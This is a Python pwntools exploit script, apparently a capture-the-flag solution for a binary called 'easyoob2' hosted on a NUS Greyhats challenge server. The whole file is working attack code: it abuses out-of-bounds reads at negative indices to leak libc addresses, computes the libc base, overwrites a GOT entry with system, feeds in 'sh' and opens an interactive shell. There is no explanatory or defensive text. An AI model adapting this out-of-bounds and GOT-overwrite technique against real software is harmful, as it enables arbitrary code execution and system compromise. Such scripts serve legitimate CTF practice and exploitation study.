from pwn import *
import sys
import regex


# --- setup ---
elf = context.binary = ELF('./easyoob2')
rop = ROP(elf)
if sys.argv[1] == 'l':
    p = process(argv=['./ld-50390b2ae8aaa73c47745040f54e602f.so.2', './easyoob2'], env={'LD_PRELOAD':'./libc6_2.31-0ubuntu9.7_amd64.so'})
    #p = process()
    gdb.attach(p)
    libc = ELF('./libc6_2.31-0ubuntu9.7_amd64.so')
else:
    p = remote('challs.nusgreyhats.org', 10526)
    libc = ELF('./libc6_2.31-0ubuntu9.7_amd64.so')
print(elf.got)


# --- exploit ---
def leak(p, index):
    p.clean()
    p.sendline(f'1 {index}')
    p.recvuntil(f'{index}. ')
    a = p.recvline().strip()
    upper = hex(int(a[0]))
    a = int(bytes.decode(a[6:], 'utf-8'))
    if a > 0:
        lower = hex(a)
        addr = f'0x7f{upper[2:]}{lower[2:]}'
        print(f"positive {addr = }")
    else:
        lower = hex(0x800000000000 + a)
        addr = f'0x7f{upper[2:]}{lower[-8:]}'
        print(f"negative {addr = }")
    return int(addr, 16)


def overwrite(p, index, addr):
    p.clean()
    # 0x00XX00000000
    upper = chr(int(hex(addr)[4:6], 16))
    # 0x0000XXXXXXXX
    lower = int(hex(addr)[6:], 16)
    payload = f'{upper}\x7f {lower}'
    p.sendline(f'2 {index} {payload}')


p.sendline(b'3 1')
puts_leak = leak(p, -16)
printf_leak = leak(p, -13)
#setvbuf_leak = leak(p, -12)
# determined libc version ./libc6_2.31-0ubuntu9.7_amd64.so

p.sendline(b'2 0 sh\x00 0')
libc_base = puts_leak - libc.sym.puts
libc.address = libc_base
print(hex(libc_base))
overwrite(p, -15, libc.sym.system)
#overwrite(p, -15, libc_base + 0xe3b34)
p.sendline(b'3 0')
p.interactive()
